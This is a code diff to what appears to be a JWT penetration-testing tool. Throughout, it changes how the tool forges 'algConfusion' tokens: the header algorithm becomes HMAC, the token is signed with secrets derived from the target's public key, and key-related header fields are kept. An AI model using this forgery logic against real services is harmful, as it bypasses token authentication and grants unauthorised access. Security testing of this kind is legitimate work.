@@ -43,6 +43,12 @@ function signHMAC(header, payload, secret, alg) {
   const sig = b64urlEncode(hmac.digest());
   return `${signingInput}.${sig}`;
 }
+function signHMACRaw(signingInput, secret, alg) {
+  const hashMap = { HS256: "sha256", HS384: "sha384", HS512: "sha512" };
+  const hmac = createHmac(hashMap[alg], secret);
+  hmac.update(signingInput);
+  return `${signingInput}.${b64urlEncode(hmac.digest())}`;
+}
 var DIGEST_INFO = {
   sha256: "3031300d060960864801650304020105000420",
   sha384: "3041300d060960864801650304020205000430",
@@ -981,12 +987,9 @@ function secretVariants(keyPem, originalAlg) {
 }
 function makeAttack(parsed, hmacAlg, secret, sourceDesc, variantLabel) {
   const header = { ...parsed.header, alg: hmacAlg };
-  delete header.jku;
-  delete header.jwk;
-  delete header.x5u;
-  delete header.x5c;
-  delete header.kid;
-  const jwt = signHMAC(header, parsed.payload, secret, hmacAlg);
+  const headerB64 = b64urlEncode(JSON.stringify(header));
+  const signingInput = `${headerB64}.${parsed.payloadB64}`;
+  const jwt = signHMACRaw(signingInput, secret, hmacAlg);
   return {
     id: nanoid(),
     technique: "algConfusion",
@@ -1003,6 +1006,9 @@ function attacksForKey(parsed, hmacAlg, originalAlg, keyPem, sourceDesc, seen) {
       const attack = makeAttack(parsed, hmacAlg, v.secret, sourceDesc, v.label);
       if (seen.has(attack.modifiedJWT)) continue;
       seen.add(attack.modifiedJWT);
+      attack.keyPem = keyPem;
+      attack.secretEncoding = v.label;
+      attack.originalJWT = `${parsed.headerB64}.${parsed.payloadB64}.${parsed.signatureB64}`;
       out.push(attack);
     } catch {
     }
